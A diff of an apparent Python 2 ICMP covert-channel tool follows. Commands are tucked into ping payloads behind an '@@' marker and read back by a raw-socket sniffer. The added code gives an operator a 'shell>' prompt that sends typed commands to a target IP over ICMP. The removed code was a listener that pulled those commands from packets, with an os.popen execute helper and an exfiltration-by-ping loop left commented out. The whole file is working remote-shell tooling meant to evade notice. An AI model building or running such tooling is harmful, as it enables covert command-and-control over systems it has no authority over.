@@ -1,11 +1,12 @@
-import os, sys, socket, struct, select, time , threading ,re
-
-
+import socket
+import re
+import thread
+from threading import *
+import os, sys, socket, struct, select, time , threading
+#HOST = socket.gethostbyname(socket.gethostname())
+##The pinging part starts here
 ICMP_ECHO_REQUEST = 8
-
-
 def checksum(source_string):
-
     sum = 0
     countTo = (len(source_string)/2)*2
     count = 0
@@ -31,13 +32,9 @@ def checksum(source_string):
 def send_one_ping(my_socket, dest_addr, ID, onlydata):
     data = "@@"+onlydata
     dest_addr  =  socket.gethostbyname(dest_addr)
-	# Header is type (8), code (8), checksum (16), id (16), sequence (16)
     my_checksum = 0
-	# Make a dummy heder with a 0 checksum.
     header = struct.pack("bbHHh", ICMP_ECHO_REQUEST, 0, my_checksum, ID, 1)
     bytesInDouble = struct.calcsize("d")
-    #data = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
-	# Calculate the checksum on the data and the dummy header.
     my_checksum = checksum(header + data)
     header = struct.pack(
         "bbHHh", ICMP_ECHO_REQUEST, 0, socket.htons(my_checksum), ID, 1
@@ -64,36 +61,47 @@ def do_one(dest_addr, timeout,payload):
     send_one_ping(my_socket, dest_addr, my_ID,payload)
     my_socket.close()
     return delay
-
-#dest = "192.168.157.128"  #the destination ip
+#The sniffer part starts here..!!!
+# def writer(d):
+# 	f = open('/root/log.txt','a')
+# 	f.write(d)
+# def clearfile():
+# 	f = open('/root/log.txt','w')
+# 	f.write("")
+# def reader():
+# 	f = open('/root/log.txt','r')
+# 	con = f.readline()
+# 	content = con.replace("@@","")
+# 	clearfile()
+# 	return content
+def startsniffing():
+	HOST = '192.168.1.135'
+	s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
+	s.bind((HOST, 0))
+	s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+	print "Sniffer Started....."
+	while 1:
+		data = s.recvfrom(65565)
+		d1 = str(data[0])
+		d2 = str(data[1])
+		data1 = re.search('@@(.*)', d1)
+		datapart = data1.group(0)
+		print datapart
+		# writer(datapart)
+		command = data1.group(0)
+		cmd = command[2:]
+		ip = d2[2:-5]
+		print command
+		print ip
+		print data
+		# print reader()
+thread.start_new_thread(startsniffing,())
+ip = raw_input("Enter the destination IP: ")
 delay = 1
-
-def execute(cmd):
-    output = os.popen(cmd)
-    return output
-
-#HOST = '192.168.157.1'  #This is the listening Host.
-HOST = raw_input("Enter the interface to listen: ")
-s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
-s.bind((HOST, 0))
-s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
-# s.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON)
-print "Server Started......"
-for i in range(1,2000):
-#while 1:
-    data = s.recvfrom(65565)
-    d1 = str(data[0])
-    data1 = re.search('@@(.*)', d1)
-    command = data1.group(0)
-    cmd = command[2:]
-    if i%2 == 0:
-        d = data[1]
-        d1 = str(d)
-        ip = d1[2:-5]
-        #print ip
-        print cmd   # Holding the command to execute
-        print ip	#Hoslding the destination address to send the ping
-        # output = execute(cmd)
-        # for line in output.readlines():
-        #     do_one(ip,delay,line)
-# s.ioctl(socket.SIO_RCVALL, socket.RCVALL_OFF)
+while 1:
+	command = raw_input("shell>")
+	if command == "quit":
+		break
+	else:
+		do_one(ip,delay,command)
+		print("Executing Command....\n")
